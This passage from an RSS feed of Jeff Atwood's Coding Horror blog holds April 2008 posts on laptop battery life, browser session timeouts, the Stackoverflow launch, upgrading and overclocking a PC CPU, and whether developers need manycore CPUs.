<li>Avoid CPU intensive web pages or programs
</li>
</ol>
That will get you most of the way there. It's tough to reduce your use of wireless on a laptop without sacrificing the essential laptop quality of portability. Beyond that, <b>keep a serious eye on your CPU usage</b>; you <i>desperately</i> want to avoid CPU intensive programs and websites while on battery. They'll kill your battery life far faster than anything else you can do with your laptop.
<p>
You could run Task Manager all the time, which shows a tiny graph of your CPU usage in real time. But do you really want to think about this? I recommend clicking on the little battery icon in the taskbar and explicitly enabling Vista's "Power saver" mode whenever you're on battery. This <b>automatically enforces a CPU usage throttle of 50 percent</b>. On a dual-core CPU, giving up one core is usually no big deal for most tasks.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
For even more battery life protection, you can edit the Power Saver plan configuration to set "minimum processor state" to something lower than 50%. Even 25% would be more than enough power for most things I do on this laptop.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-04-13T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/revisiting-how-much-power-does-my-laptop-really-use/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Your Session Has Timed Out ]]></title>
<link>https://blog.codinghorror.com/your-session-has-timed-out/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
How many times have you returned to your web browser to be greeted by this unpleasant little notification:
</p>
<p>
</p>
<blockquote>
<font color="red">Your session has timed out. Please sign in again.</font>
</blockquote>
<p>
If you're anything like me, the answer is <i>lots</i>. What's worse is that you're usually kicked out of whatever page context you were working in. You have to manually log in again, remember what you were doing, then navigate back to where you were and resume your work.
</p>
<p>
Most programmers look at these sort of <b>browser session timeouts</b> as a necessary evil -- sometimes even as a security "feature". I know my bank website zealously logs me out of its web interface if I'm idle for more than five minutes. I'm not sure either one of these reasons are particularly justifiable.
</p>
<p>
<b>As a programmer, I understand why session expiration occurs.</b> The HTTP protocol that the web is built on is <i>stateless</i>. That means every individual request your browser sends to a web server is a newborn babe, cruelly born into a world that is utterly and completely oblivious to its existence. The way modern web applications get around this is by telling the browser to send a small, unique value back to the website with each request -- this is known as a <a href="http://en.wikipedia.org/wiki/HTTP_cookie">HTTP cookie</a>. It sounds a lot tastier than it looks:
</p>
<p>
</p>
<blockquote>
Content-type: text/html<br>
Cookie: <b>SessionId=5451297120</b>
</blockquote>
<p>
While there are <a href="http://www.google.com/search?q=cookies+privacy">privacy concerns with cookies</a>, it is a generally accepted practice today -- at least for the <a href="http://www.opentracker.net/en/articles/all-about-cookies-third-party.jsp">first-party cookie flavors</a>. While it is <i>possible</i> to maintain state without cookies, it's painful and awkward.
</p>
<p>
Every web request to that server will include its own cookie and associated session id until it expires, usually many months or even years hence. The browser definitely isn't the forgetful party here.
</p>
<p>
It's up to the <i>server</i> to correlate the unique session identifier sent by the browser with your individual identity, context, settings, and preferences. This is usually stored in a database of some kind, keyed by your session identifier. For performance reasons, some chunk of session information also ends up in the server's memory; there's no need to reach all the way out to the database the next twenty-six times you obsessively refresh your Facebook profile page.
</p>
<p>
Still, that doesn't explain why the web server mysteriously forgets about us. If anything, the server has all the information it needs to remember you, even if you walked away from your computer for a week. So why <i>does</i> the server choose to arbitrarily forget about you in an hour?
</p>
<p>
</p>
<ol>
<li>
<b>Performance.</b> Consider a highly trafficked web site. If the website tried to keep sessions alive for an entire month, that could cause the session table to grow to millions of records. It's even worse if you think about it in terms of user information cached in memory; a measly few kilobytes of memory state per user doesn't sound like much, but multiplied by a few million, it absolutely is. If this data wasn't expired and dumped on some schedule, it would quickly blow up the web server.
<p>
</p>
</li>
<li>
<b>Security.</b> The <a href="http://en.wikipedia.org/wiki/Magic_cookie">magic cookie</a> that stores your session can potentially be stolen. If that cookie never expires, you have an infinitely long vulnerability window to <a href="http://en.wikipedia.org/wiki/Session_hijacking">session hijacking</a>. This is serious stuff, and mitigation strategies are <a href="http://en.wikipedia.org/wiki/Session_hijacking#Prevention">limited</a>. The best option, short of encrypting the entire connection from end to end via HTTPS, is to keep a tight expiration window on the session cookie, and regenerate them frequently.
</li>
</ol>
<p>
That's the why of browser session timeouts from the programmer's perspective. But that doesn't make it right. Far from it.
</p>
<p>
<b>As a user, I can say pretty unequivocally that session expiration <i>sucks</i>.</b> Is it really so unreasonable to start doing something in your web browser, walk away for an hour -- maybe even for a few hours -- then come back and expect things to <i>just work?</i>
</p>
<p>
As programmers, I think we can do better. It is possible. I am inundated with session timeout messages every day from a variety of sources, but I've never <i>once</i> seen a session expiration message from gmail, for example. Here's what I suggest:
</p>
<p>
</p>
<ol>
<li>Create a background JavaScript process in the browser that <b>sends regular heartbeats to the server</b>. Regenerate a new cookie with timed expiration, say, every 5 or 10 minutes.
<p>
</p>
</li>
<li>If you're worried about session hijacking -- and <a href="http://news.bbc.co.uk/2/hi/technology/6929258.stm">you <i>really</i> should be</a> -- <b>use a HTTPS protected connection</b>. This is an absolute no-brainer for financial institutions of any kind.
</li>
</ol>
<p>
I wish more developers would <b>test their web applications for session timeout issues.</b> Despite all rumors to the contrary, your users will not be dedicating their entire lives to using your web application in a punctual and timely manner. They have phone calls to take, meetings to go to, other websites and applications to attend to.
</p>
<p>
Is it really fair to kick users all the way out of your web application, or worse, blindly reject data they've submitted -- just because they were <i>impudent</i> enough to wait a few hours since their last supplication to the web server gods? In most web apps, the penance is awfully severe for such a common sin.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-04-15T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/your-session-has-timed-out/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Introducing Stackoverflow.com ]]></title>
<link>https://blog.codinghorror.com/introducing-stackoverflow-com/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
A little over a month ago, I announced that I was <a href="http://www.codinghorror.com/blog/archives/001074.html">quitting my job</a>. But there was also something else I didn't fully announce.
</p>
<p>
</p>
<blockquote>
But <strong>I refuse to become a full-time blogger</strong>. I think that's a cop-out. If I look at the people I respect most in the industry, the people I view as role models-- <a href="http://www.paulgraham.com/articles.html">Paul Graham</a>, <a href="http://www.joelonsoftware.com/">Joel Spolsky</a>, <a href="http://steve-yegge.blogspot.com/">Steve Yegge</a>, <a href="http://www.ericsink.com/">Eric Sink</a>, <a href="http://www.skrenta.com/">Rich Skrenta</a>, <a href="http://blog.pmarca.com/">Marc Andreesen</a>, <a href="http://www.wilshipley.com/blog/">Wil Shipley</a>, <a href="http://www.crockford.com/">Douglas Crockford</a>, <a href="http://weblogs.asp.net/scottgu/">Scott Guthrie</a> -- they all have one thing in common. They're not just excellent writers and communicators. <strong>They build stuff, too</strong>. The world has enough vapid commentary blogs. <a href="http://www.codinghorror.com/blog/archives/000809.html">I want to build stuff</a>-- <em>and</em> talk about it. I have a little micro-ISV startup opportunity I'll be working on, a web property I'm building out with one of the above people. I'm not ready to announce the details yet, but when I do, you'll read about it here.
</blockquote>
<p>
The "building stuff", as <a href="http://www.codinghorror.com/blog/archives/001095.html">you helped us determine</a>, is stackoverflow.com. It's a small company <strong>Joel Spolsky</strong> and I are founding together.
</p>
<p>
If you've been reading my blog for a while, you might find this pairing strange. It's true that I've been <a href="http://www.codinghorror.com/blog/archives/000679.html">critical of Joel</a> in the past. And it <em>is</em> sort of funny that I own the <a href="http://images.google.com/images?q=joel+spolsky">number one image search result</a> and <a href="http://www.google.com/search?q=joel+spolsky">a top 10 search result</a> for Joel Spolsky. Good thing Joel has a sense of humor.
</p>
<p>
Occasionally I'll meet readers, or get emails from readers, who tell me that they enjoy my blog... and oh-by-the-way they strongly disagree with a few things I've said. Their phrasing clearly implies that they think there's something <em>wrong</em> with this. Well, there isn't. I'm here to tell you that <strong>occasional disagreement is healthy and normal</strong>. If you agree with everything I write here, why would you bother reading? At that point, we're the same person. I distrust people who agree with me all the time. I <em>want</em> someone to push back and encourage me to <a href="http://www.codinghorror.com/blog/archives/001080.html">question my assumptions</a>.
</p>
<p>
I admire what Joel has created. He was one of the <a href="http://www.joelonsoftware.com/articles/fog0000000077.html">earliest </a> programming bloggers, and certainly one of the first I found that helped me realize the kind of positive influence writing could have on my fellow programmers. He is very much living the dream: he founded a company with the express intent of not cashing out with VC money, but creating a sustainible place where programmers can <a href="http://www.codinghorror.com/blog/archives/000979.html">have fun while programming useful stuff</a>. It's an honor to have the opportunity to work closely with Joel, and to combine the collective power of our two communities.
</p>
<p>
So what <em>is</em> stackoverflow?
</p>
<p>
From day one, my blog has been about putting helpful information out into the world. I never had any particular aspirations for this blog to become what it is today; I'm humbled and gratified by its <a href="http://www.codinghorror.com/blog/archives/000983.html">amazing success</a>. It has quite literally changed my life. Blogs are fantastic resources, but as much as I might <a href="http://steve.yegge.googlepages.com/you-should-write-blogs">encourage my fellow programmers to blog</a>, not everyone has the time or inclination to start a blog. There's far too much great programming information trapped in forums, buried in online help, or hidden away in <a href="http://www.codinghorror.com/blog/archives/000971.html">books that nobody buys any more</a>. We'd like to unlock all that. Let's create something that makes it easy to participate, and put it online in a form that is trivially easy to find.
</p>
<p>
Are you familiar with <a href="http://everything2.com/index.pl?node_id=1441060">the movie pitch formula</a>?
</p>
<p>
<strong>Stackoverflow is sort of like the anti-<a href="http://experts-exchange.com/">experts-exchange</a> (minus the nausea-inducing sleaze and quasi-legal search engine gaming) meets <a href="http://www.wikipedia.com/">wikipedia</a> meets <a href="http://programming.reddit.com/">programming reddit</a>.</strong> It is by programmers, for programmers, with the ultimate intent of collectively increasing the sum total of <em>good</em> programming knowledge in the world. No matter what programming language you use, or what operating system you call home. Better programming is our goal.
</p>
<p>
Of course, there's more to it than that. Joel and I are <strong>recording our weekly calls and releasing them as podcasts</strong>. Listen to us describe our vision for stackoverflow in our own words -- just <a href="http://www.stackoverflow.com/">head over to stackoverflow.com</a> to download the first 46 minute episode. We're even taking questions, if you submit them in the form of audio recordings.
</p>
<p>
</p>
<script type="text/javascript">google_ad_client = &quot;pub-6424649804324178&quot;;google_ad_slot = &quot;8324348970&quot;;google_ad_width = 728;google_ad_height = 90;</script><script src="http://pagead2.googlesyndication.com/pagead/show_ads.js" type="text/javascript"></script>
<p></p>
<p></p>
<p></p>
<p></p>
<p></p>
<p></p>
<p></p>
<p></p>
<p></p>
<p></p>
<p></p>
<p></p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-04-16T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/introducing-stackoverflow-com/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Building a PC, Part V: Upgrading ]]></title>
<link>https://blog.codinghorror.com/building-a-pc-part-v-upgrading/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>Last summer I posted a four part series on building your own PC:</p>
<p> </p>
<ul>
<li>
<a href="http://www.codinghorror.com/blog/archives/000905.html">Building a PC, Part I: Minimal boot</a> </li>
<li>
<a href="http://www.codinghorror.com/blog/archives/000907.html">Building a PC, Part II: Burn in</a> </li>
<li>
<a href="http://www.codinghorror.com/blog/archives/000908.html">Building a PC, Part III: Overclocking</a> </li>
<li>
<a href="http://www.codinghorror.com/blog/archives/000918.html">Building a PC, Part IV: Now It's Your Turn</a> </li>
</ul>
<p>My personal system is basically identical to that build, though it predates it by <a href="http://www.codinghorror.com/blog/archives/000707.html">about six months</a>. The only significant difference is the substitution of the Core 2 Duo E6600 CPU.</p>
<p>In my opinion, quad-core CPUs are still a <a href="http://www.codinghorror.com/blog/archives/000942.html">waste of electricity</a> unless you're putting them in a server. Four cores on the desktop is great for bragging rights and mathematical superiority (yep, 4 &gt; 2), but those four cores <a href="http://www.codinghorror.com/blog/archives/000655.html">provide almost no benchmarkable improvement</a> in the type of applications most people use. Including software development tools. (<span style="color: red;">Update:</span> This paragraph was more controversial than intended. See <a href="http://www.codinghorror.com/blog/archives/001103.html">Should All Developers Have Manycore CPUs?</a> for a clarification.)</p>
<p><img alt="image placeholder" >
<p>My original advice stands: for the vast majority of users, the fastest possible dual-core CPU remains the best choice. I overclocked my E6600 CPU <strong>from 2.4 Ghz to 3.2 Ghz</strong>, instantly increasing the value of the processor by about 800 bucks.</p>
<p>Beyond overclocking, <strong>the economy of building your own PC also lies in upgrading it in pieces and parts to keep it up to date</strong>. Once you've taught yourself to build a PC, swapping parts out is easy. That's an option you almost never have on laptops, and rarely on commercial desktops.</p>
<p>It's been almost a year and a half since I made any significant change to my PC build. That's an eternity in computer dog years. I was developing a serious itch to upgrade something -- <em>anything</em> -- on my PC. I did a bit of research, and I was surprised to find that the P965 chipset on my Asus P5B Deluxe motherboard supports the latest and greatest Intel CPUs. This is a pleasant surprise indeed; Intel and AMD change the pinouts and sockets of their CPUs quite regularly. A simple CPU upgrade, more often than not, forces a complete motherboard and memory upgrade. But not in this case!</p>
<p>So here's what I did:</p>
<ol>
<li>flash the BIOS* on my motherboard to the latest version, which supports the newest CPUs </li>
<li>remove the old and busted CPU (Core 2 Duo E6600, 2.4 GHz, 4 MB L2) </li>
<li>drop in the new hotness CPU (Core 2 Duo E8500, 3.16 GHz, 6 MB L2) </li>
<li>Manually <a href="http://www.codinghorror.com/blog/archives/000697.html">adjust FSB speed, memory voltage and CPU voltage</a> </li>
</ol>
<p>This chip is an <em>outstanding</em> overclocker. It's almost a no-brainer. The tubes are <a href="http://www.google.com/search?q=e8500+overclocking">full of documented cases</a> of this chip reaching 4.5 GHz and sometimes higher. I was fairly content with <strong>my effortless 4 GHz overclock</strong>:</p>
<p><img alt="image placeholder" >
<p>If you're wondering why <a href="http://www.cpuid.com/cpuz.php">CPU-Z</a> says this is a 2520 MHz CPU instead of the 4000 MHz you'd expect, that's because the CPU is idle. All modern CPUs <a href="http://en.wikipedia.org/wiki/SpeedStep">clock down at idle</a> to reduce power draw. If you run something CPU intensive, you'll see the CPU speed dynamically change in CPU-Z, as illustrated by this animated GIF:</p>
<p><img alt="image placeholder" >
<p>This power savings is achieved by dropping the CPU multiplier from its default of 9.5 down to 6.0. If we do a little math, it's easy to infer the relationship between FSB (front side bus), CPU multiplier, and actual CPU speed:</p>
<p> </p>
<table cellspacing="4" cellpadding="4" width="400">
<tbody>
<tr>
<td>315 MHz</td>
<td>6.0x</td>
<td>1890 MHz</td>
</tr>
<tr>
<td>333 MHz</td>
<td>9.5x</td>
<td>3163 MHz</td>
</tr>
<tr>
<td>420 MHz</td>
<td>6.0x</td>
<td>2520 MHz</td>
</tr>
<tr>
<td><span style="color: red;">420 MHz</span></td>
<td><span style="color: red;">9.5x</span></td>
<td><span style="color: red;">3990 MHz</span></td>
</tr>
</tbody>
</table>
<p> </p>
<p>Overclocking the CPU is simple if you can stumble your way through a few basic BIOS screens. The default voltage on this E8500 is 1.128 volts. By juicing the CPU voltage up to 1.36 volts, and setting the front side bus (FSB) to 420 MHz, we can hit the magical 4 GHz number. All we need to do is a little unit testing<a href="http://www.codinghorror.com/blog/archives/000907.html">burn-in torture testing</a>, and we can confirm that it's stable.</p>
<p>But you might wonder -- does this overclocking stuff really justify the hassle? Is <strong>going from 3.0 GHz to 4.0 GHz really <em>worth</em> it in terms of actual performance and not just bragging rights?</strong></p>
<p>I'm glad you asked!</p>
<p>I clocked my E8500 to 3.0 GHz / 315 FSB and 4.0 GHz / 420 FSB and ran a few quick <a href="http://webkit.org/perf/sunspider-0.9/sunspider.html">SunSpider JavaScript benchmarks</a>. You may remember this great little benchmark from <a href="http://www.codinghorror.com/blog/archives/001023.html">The Great Browser JavaScript Showdown</a>.  Here's what I found:</p>
<p><img alt="image placeholder" >
<p>And the overall benchmark result in table form:</p>
<p> </p>
<table cellspacing="4" cellpadding="4" width="500">
<tbody>
<tr>
<td> </td>
<td align="right">3 GHz</td>
<td align="right">4 GHz</td>
<td> </td>
</tr>
<tr>
<td>Internet Explorer 7 SP1</td>
<td align="right">15,824 ms</td>
<td align="right">12,748 ms</td>
<td>19% faster</td>
</tr>
<tr>
<td>Firefox 3.0 Beta 5</td>
<td align="right">3,018 ms</td>
<td align="right">2,450 ms</td>
<td>19% faster</td>
</tr>
</tbody>
</table>
<p> </p>
<p>That's <strong>a consistent 19% performance improvement in an interpreted browser language for a 33% increase in raw CPU clock speed</strong>. Not too shabby. It's actually more than I expected. The real speed difference between an E6600 and E8500 would be (slightly) greater than the pure clock speed indicates, due to the architectural improvements and larger L2 cache in the E8500. There also might be other languages and apps that scale more linearly with that 33% CPU clock speed increase.</p>
<p><strong>Compare the result of going from 3 GHz to 4 GHz with adding another two cores</strong>, which would produce exactly <em>zero</em> improvement in your JavaScript benchmarks. Most apps are barely multithreaded, much less capable of taking advantage of all four cores. Having four CPU cores won't help you much when they're all poking along at a leisurely 2 GHz.</p>
<p>So if you followed our original PC build plan, or if you're planning to build your own PC -- <strong>don't forget to factor upgrading into your system's lifespan!</strong> These builds are eminently upgradeable. Sometimes you'll get lucky and have <em>knockout</em> upgrade options like the E8500: a 4 GHz (almost) guaranteed drop-in CPU replacement for under 300 bucks.</p>
<p><span>* I am simplifying a little because I don't want to scare anyone. In the interests of full disclosure, here's the story. The ASUS Windows x64 BIOS flash program crashed while updating the motherboard BIOS. I can't quite describe the chill that went down my spine as I watched this happen. Any failure during a BIOS flash is irrevocable and permanent, the very definition of "bricking". To be fair, this is literally the first time I've ever bricked <em>anything</em> in at least 10 years of regular yearly BIOS flashing. I had to buy another motherboard and initiate a RMA on my original, newly BIOS-free motherboard. Let this be a lesson to you, kids: don't trust Windows software developers! Always update the BIOS from a boot CD or from within the BIOS itself using a USB key!</span></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-04-17T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/building-a-pc-part-v-upgrading/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Should All Developers Have Manycore CPUs? ]]></title>
<link>https://blog.codinghorror.com/should-all-developers-have-manycore-cpus/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
Dual core CPUs are effectively standard today, and for good reason -- there are substantial, demonstrable performance improvements to be gained from having a second CPU on standby to fulfill requests that the first CPU is too busy to handle. If nothing else, <b>dual-core CPUs protect you from badly written software</b>; if a crashed program consumes all possible CPU time, all it can get is 50% of your CPU. There's still another CPU available to ensure that the operating system can let you kill CrashyApp 5.80 SP1 Enterprise Edition in a reasonable fashion. It's the <a href="http://en.wikipedia.org/wiki/Buddy_system">buddy system</a> in silicon form.
</p>
<p>
My <a href="http://www.codinghorror.com/blog/archives/001102.html">previous post on upgrading the CPU in your PC</a> was more controversial than I intended. Here's what I wrote:
</p>
<p>
</p>
<blockquote>
In my opinion, quad-core CPUs are still a <a href="http://www.codinghorror.com/blog/archives/000942.html">waste of electricity</a> unless you're putting them in a server. Four cores on the desktop is great for bragging rights and mathematical superiority (yep, 4 &gt; 2), but those four cores <a href="http://www.codinghorror.com/blog/archives/000655.html">provide almost no benchmarkable improvement</a> in the type of applications most people use. Including software development tools.
</blockquote>
<p>
It's unfortunate, because this statement overshadowed the rest of the post. All I wanted to do here is <b>encourage people to make an <i>informed</i> decision in selecting a CPU</b>. Really, pick any CPU you want; the important part of that post is being unafraid to upgrade your PC. Insofar as the above paragraph distracted readers from that goal, I apologize.
</p>
<p>
However, I do have strong feelings on this topic. All too often I see users seduced by Intel's marketing department, blindly assuming that if two CPU cores is faster than one CPU core, then, well.. four, eight, or sixteen must be <i>insanely</i> fast! And out comes their wallet. I fear that many users fall prey to marketing weasels and end up paying a premium for performance that, for them, will never materialize. It's like the bad old days of the Pentium 4 again, except for absurd megahertz clock speeds, substitute an absurd number of CPU cores.
</p>
<p>
I want people to understand that <b>there are only a handful of applications that can truly benefit from more than 2 CPU cores</b>, and they tend to cluster tightly around certain specialized areas. To me, it's all about the <a href="http://www.codinghorror.com/blog/archives/000942.html">benchmark</a> <a href="http://www.codinghorror.com/blog/archives/000655.html">data</a>, and the benchmarks just don't show any compelling reason to go quad-core unless you regularly do one of the following:
</p>
<p>
</p>
<ul>
<li>"rip" or encode video
</li>
<li>render 3D scenes professionally
</li>
<li>run scientific simulations
</li>
</ul>
<p>
If you frequently do any of the above, there's <i>no question</i> that a quad-core (or octa-core) is the right choice. But this is merely my recommendation based on the benchmark data, not iron-clad fact. It's your money. Spend it how you like. All I'm proposing is that you spend it knowledgably.
</p>
<p>
Ah, but then there's the <b>multitasking argument</b>. I implored commenters who felt strongly about the benefits of quad-core to point me to multitasking benchmarks that showed a profound difference in performance between 2 and more-than-2 CPU cores. It's curious. The web is awash in zillions of hardware review websites, yet you can barely find any multitasking benchmarks on any of them. I think it's because <b>the amount of multitasking required to seriously load more than two CPU cores borders on the absurd</b>, as <a href="http://www.anandtech.com/printarticle.aspx?i=2879">Anand points out</a>:
</p>
<p>
</p>
<blockquote>
When we were trying to think up new multitasking benchmarks to truly stress Kentsfield and Quad FX [quad-core] platforms we kept running into these interesting but fairly out-there scenarios that did a great job of stressing our test beds, but a terrible job and making a case for how you could use quad-core today.
</blockquote>
<p>
What you will find, however, is this benchmarking refrain repeated again and <a href="http://techreport.com/articles.x/14424/7">again</a>:
</p>
<p>
</p>
<blockquote>
Like most of the desktop applications out there today, including its component apps, WorldBench doesn't gain much from more than two CPU cores.
</blockquote>
<p>
That said, I think I made a mistake in my original statement. <b>Software developers aren't typical users</b>. Indeed, you can make a reasonable case that software developers are almost by definition edge conditions and thus they should <i>seek out </i> many-core CPUs, as <a href="http://brokencoder.com/">Kevin</a> said in the comments:
</p>
<p>
</p>
<blockquote>
How would you suggest developers write applications (this is what we are, and what we do, right?) that can actually leverage 4, 8, etc... CPU cores if we are running solo or dual core systems? I put this right up there with having multiple monitors. Developers need them, and not just to improve productivity, but because they won't under stand just how badly their application runs across multiple monitors unless they actually use it. The same is true with multi-core CPUs.
</blockquote>
<p>
I have two answers to this. One of them you probably won't like.
</p>
<p>
Let's start with the first one. <b>I absolutely agree that it is important for software developers to consider multi-core software development</b>, and owning one on their desktop is a prerequisite. I originally wrote about this way, way back in 2004 in <a href="http://www.codinghorror.com/blog/archives/000169.html">Threading, Concurrency, and the Most Powerful Psychokinetic Explosive in the Universe</a>. In fact, two of the people I quoted in that old article -- true leaders in the field of concurrent programming -- both posted direct responses to my article yesterday, and they deserve a response.
</p>
<p>
Rick Brewster, of the <a href="http://www.codinghorror.com/blog/archives/000993.html">seriously amazing Paint.NET project</a>, had this to say in a comment:
</p>
<p>
</p>
<blockquote>
Huh? Paint.NET, for one, shows large gains on quad-core versus dual-core systems. There's even <a href="http://paintdotnet.forumer.com/viewtopic.php?f=16&amp;t=21669">a benchmark</a>. I'd say that qualifies as "applications most people use."
</blockquote>
<p>
He's absolutely right. A quad-core Q6700 @ 2.66 GHz trounces my dual-core E8500 @ 4.0 GHz on this benchmark, to the tune of 26 seconds vs. 31 seconds. But with all due respect to Rick -- and seriously, I absolutely adore <a href="http://www.codinghorror.com/blog/archives/000993.html">Paint.NET</a> and his multithreading code is <a href="http://blog.getpaint.net/2008/03/23/paintnet-just-can%E2%80%99t-satisfy-an-8-core-opteron/">incredible</a> -- I feel this benchmark tests specialized (and highly parallelizable) filters more than core functionality. There's a long history of <a href="http://www.barefeats.com/quad11.html">Photoshop benchmarking</a> along the same lines; it's the 3D rendering case minus one dimension. If you spend a significant part of your day in Photoshop, you should absolutely pick the platform that runs it fastest.
</p>
<p>
But we're developers, not designers. We spend all our time talking to compilers and interpreters and editors of various sorts. <a href="http://en.wikipedia.org/wiki/Herb_Sutter">Herb Sutter</a> posted an entire blog entry clarifying that, indeed, <a href="http://herbsutter.wordpress.com/2008/04/18/quad-core-a-waste-of-electricity/">software development tools do take advantage of quad-core CPUs</a>:
</p>
<p>
</p>
<blockquote>
You must not be using the right tools. :-) For example, here are three I'm familiar with:
<ol>
<li>Visual C++ 2008's <a href="http://msdn2.microsoft.com/en-us/library/bb385193.aspx">/MP flag</a> tells the compiler to compile files in the same project in parallel.
</li>
<li>Since Visual Studio 2005 we've supported <a href="http://msdn2.microsoft.com/en-us/library/9h3z1a69.aspx">parallel project builds</a> in Batch Build mode
</li>
<li>Excel 2007 does <a href="http://msdn2.microsoft.com/en-us/library/bb687899.aspx">parallel recalculation</a>. Assuming the spreadsheet is large and doesn't just contain sequential dependencies between cells, it usually scales linearly up to at least 8 cores.
</li>
</ol>
</blockquote>
<p>
Herb is an industry expert on concurrent programming and general C++ guru, and of course he's right on all three counts. I had completely forgotten about C++ compilation, or maybe it's more fair to say <i>I blocked it out</i>. What do you expect from a guy with a BASIC lineage? Compilation time is a huge productivity drain for C++ developers working on large projects. Compilation time using <code>gcc</code> and <code>time make -j&lt;# of cores + 1&gt;</code> is the granddaddy of all multi-core programmer benchmarks. Here's a representative result for <a href="http://www.phoronix.com/scan.php?page=article&amp;item=585&amp;num=4">compiling the LAME 3.97 source</a>:
</p>
<p>
</p>
<table cellpadding="4" cellspacing="4" width="400">
<tr>
<td>1</td>
<td>Xeon E5150 (2.66 GHz Dual-Core)</td>
<td align="right">12.06 sec</td>
</tr>
<tr>
<td>1</td>
<td>Xeon E5320 (1.86 GHz Quad-Core)</td>
<td align="right">11.08 sec</td>
</tr>
<tr>
<td>2x</td>
<td>Xeon E5150</td>
<td align="right">8.26 sec</td>
</tr>
<tr>
<td>2x</td>
<td>Xeon E5320</td>
<td align="right">8.45 sec</td>
</tr>
</table>
<p>
The absolute numbers seem kind of small, but the percentages are incredibly compelling, particularly as you add up the number of times you compile every day. <b>If you're a C++ developer, you <i>need</i> a quad-core CPU yesterday.</b> Demand it.
</p>
<p>
But what about us managed code developers, with our lack of pointers and explicit memory allocations? Herb mentioned the parallel project builds setting in Visual Studio 2008; it's under Tools, Options, Projects and Solutions, Build and Run.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
As promised, it's defaulting to the number of cores I have in my PC -- two. I downloaded the very largest .NET project I could think of off the top of my head, <a href="http://www.icsharpcode.net/OpenSource/SD/Download/">SharpDevelop</a>. The solution is satisfyingly huge; it contains 60 projects. I compiled it a few times in Visual Studio 2008, but task manager wasn't showing much use of even my measly little two cores:
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
I did see a few peaks above 50%, but it's an awfully tepid result compared to the <code>make -j4</code> one. I see nothing here that indicates any kind of possible managed code compilation time performance improvement from moving to more than 2 cores. I'm sort of curious if Java compilers (or other .NET-like language compilers) do a better job of this.
</p>
<p>
Getting back to Kevin's question: yes, if you are a software developer writing a desktop application that has something remotely parallelizable in it, <b>you should have whatever number of CPU cores on the desktop you need to test and debug your code</b>. I suggest starting with a goal of scaling well to two cores, as that appears to be the most challenging part of the journey. Beyond that, good luck and godspeed, because everything I've ever read on the topic of writing scalable, concurrent software goes out of its way to explain in excruciating detail how hellishly difficult this kind of code is to write.
</p>
<p>
Here's the second part of the answer I promised you earlier. The one you might not like. <b>Most developers <i>aren't</i> writing desktop applications today. They're writing web applications.</b> Many of them may be writing in scripting languages that aren't compiled, but interpreted, like Ruby or Python or PHP. Heck, they're probably not even threaded. And yet this code somehow achieves massive levels of concurrency, scales to huge workloads, and drives some of the largest websites on the internet. All that, without thinking one iota about concurrency, threading, or reentrancy. It's sort of magical, if you think about it.
</p>
<p>
So in the sense that mainstream developers are modelling server workloads on their desktops, I agree, they <i>do</i> probably need as many cores as they can get.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-04-18T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/should-all-developers-have-manycore-cpus/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Everything I Needed to Know About Programming I Learned from BASIC ]]></title>
<link>https://blog.codinghorror.com/everything-i-needed-to-know-about-programming-i-learned-from-basic/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
<a href="http://en.wikipedia.org/wiki/Edsger_Dijkstra">Edsger Dijkstra </a> had <a href="http://www.cs.virginia.edu/~evans/cs655-S00/readings/ewd498.html">this</a> to say about Beginner's All Purpose Symbolic Instruction Code:
</p>
<blockquote>
It is practically impossible to teach good programming style to students that have had prior exposure to BASIC; as potential programmers they are mentally mutilated beyond hope of regeneration.
</blockquote>
<p>
I'm sure he was exaggerating here for effect; as much as I admire his <a href="http://www.codinghorror.com/blog/archives/000051.html">1972 "The Humble Programmer" paper</a>, it's hard to square that humility with the idea that choosing the wrong programming language will damage the programmer's mind. Although <a href="http://www.codinghorror.com/blog/archives/000686.html">computer languages continue to evolve</a>, the largest hurdle I see isn't any particular choice of language, but the fact that <a href="http://www.codinghorror.com/blog/archives/000272.html">programmers can write FORTRAN in any language</a>. To quote Pogo, we have met the enemy, and <a href="http://upload.wikimedia.org/wikipedia/en/4/49/Pogo_-_Earth_Day_1971_poster.jpg">he is us</a>.
</p>
<p>
Dismissing BASIC does seem rather elitist. Like many programmers of a certain age, <strong>I grew up with BASIC</strong>.
</p>
<p>
I mentioned in <a href="http://www.codinghorror.com/blog/archives/001096.html">an earlier post</a> the curious collision of early console gaming and programming that was the <a href="http://www.atariage.com/software_page.html?SoftwareLabelID=15">Atari 2600 BASIC Programming cartridge</a>. I had to see this for myself, so I bought a copy on eBay.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
I also bought a set of the Atari 2600 <a href="http://www.atariage.com/controller_page.html?SystemID=2600&amp;ControllerID=4">keypad controllers</a>. The overlays come with the cartridge, and the controllers mate together to make a primitive sort of keyboard. (Also, if you were wondering what kinds of things I do with my ad revenue, buying crap like this is a big part of it, sadly.)
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
